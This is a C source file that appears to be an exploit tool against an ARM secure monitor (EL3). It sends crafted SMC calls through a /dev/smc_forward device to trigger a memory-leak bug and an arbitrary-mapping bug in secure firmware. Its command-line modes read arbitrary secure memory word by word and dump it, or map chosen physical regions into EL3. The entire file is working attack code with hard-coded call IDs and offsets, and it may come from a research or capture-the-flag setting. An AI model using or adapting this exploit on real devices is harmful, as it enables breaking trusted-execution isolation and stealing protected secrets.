#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdint.h>

#define SMC_LEAK_PC      0x8300ff00
#define SMC_LEAK_ADDR    0x8300ff02

#define NR_SMC_ARGS 7
#define IOCTL_SMC     _IOWR('s', 0, struct smc_data*) // send smc

struct smc_data {
    uint64_t args[NR_SMC_ARGS];
};

struct smc_alloc {
    ssize_t size;
    void*   phy;
    void*   virt;
};

struct smc_read {
    ssize_t size;
    void*   phy;
    void*   virt;
    void*   outbuf;
};

#define SMC_DEV "/dev/smc_forward"

uint32_t send_smc(struct smc_data *args);
uint32_t vuln_mmap(uint64_t value);
uint32_t leak_vuln(uint64_t value);

inline uint32_t send_smc(struct smc_data *args)
{
        int fd = open(SMC_DEV, O_RDWR);
        if(fd < 0) {
                printf("Cannot open device file...\n");
                return 0;
        }

        ioctl(fd, IOCTL_SMC, (struct smc_data*) args);

        close(fd);
        return args->args[0];
}

// Trigger the vuln to mmap anything in EL3
#define MMAP_MAX_SIZE 0x100000

/* Trigger the vuln to mmap a memory region */
inline uint32_t vuln_mmap(uint64_t addr)
{
        struct smc_data args = {
                0x8200022a, // spm_args
                0x1, // spm_load_firmware
                addr, // leak 4 bytes from addr
                MMAP_MAX_SIZE, // max size that we can mmap
                0x0,
                0x0,
                0x0,
        };
        send_smc(&args);
        return 0;
}

/* Trigger the vuln to leak a word */
inline uint32_t leak_vuln(uint64_t addr)
{
        struct smc_data args = {
                0xc2000526, // leak vuln
                (uint64_t)(addr - 0x4ce2f578) / 4, // leak 4 bytes from addr
                0x0,
                0x0,
                0x0,
                0x0,
                0x0,
        };
        send_smc(&args);
        return args.args[2];
}

static int leak_data_by_words(uint64_t addr, uint32_t* dest, ssize_t size)
{
        for (uint64_t off = 0; off < size; off = off + 4) 
                *(uint32_t*)((uint8_t*)dest + off) = (uint32_t)leak_vuln(addr+off);

        return 0;
}

/* Mmap a data region */
static int mmap_data(uint64_t addr, ssize_t size)
{
        // MMAP_MAX_SIZE is the max size that can be mapped through the vuln
        for (uint64_t mmap_offset=0; (mmap_offset<size); mmap_offset = mmap_offset + MMAP_MAX_SIZE) {
                vuln_mmap(addr+mmap_offset); // mmap the memory region
        }

        return 0;
}

/* Leak a data region */
static int leak_data(uint64_t addr, ssize_t size)
{
        uint8_t buf[MMAP_MAX_SIZE];
        // MMAP_MAX_SIZE is the max size that can be mapped through the vuln
        for (uint64_t mmap_offset=0; (mmap_offset<size); mmap_offset = mmap_offset + MMAP_MAX_SIZE) {
                uint32_t size2 = (size>MMAP_MAX_SIZE)?MMAP_MAX_SIZE:size;
                memset(buf, 0, size2);

                leak_data_by_words(addr+mmap_offset, (uint32_t*)buf, size2); // then leak it
                for (int i = 0; i < size2; i++)
                        printf("%c", buf[i]);
        }

        return 0;
}

static void usage()
{
        printf("Usage: send_smc leak_vuln <addr (hex)>\n\
                \tsend_smc mmap <addr (hex)>\n\
                \tsend_smc mmap_data <addr (hex)> <size (hex)>\n\
                \tsend_smc leak_data <addr (hex)> <size (hex)>\n");
        exit(-2);
}

int main(int argc, char *argv[])
{
        if (argc < 3)
                usage();

        if (!strcmp(argv[1], "mmap")) {    // mmap in el3
                vuln_mmap(strtoll(argv[2], NULL, 16));
                return 0;
        } else if (!strcmp(argv[1], "leak_vuln")) {           // leak vuln
                printf("%x\n", leak_vuln(strtoll(argv[2], NULL, 16)));
                return 0;
        } else if ((!strcmp(argv[1], "mmap_data")) || (!strcmp(argv[1], "leak_data"))) {    // leak
                if (argc < 4)
                        usage();

                uint32_t num_bytes = 1;
                if (argc >=5)
                        num_bytes = strtoll(argv[4], NULL, 16);

                ssize_t size;
                uint32_t addr = strtoll(argv[2], NULL, 16);
                size = strtoll(argv[3], NULL, 16);

                if (!strcmp(argv[1], "mmap_data"))
                        mmap_data(addr, size);
                else
                        leak_data(addr, size);
        }

        return 0;
}
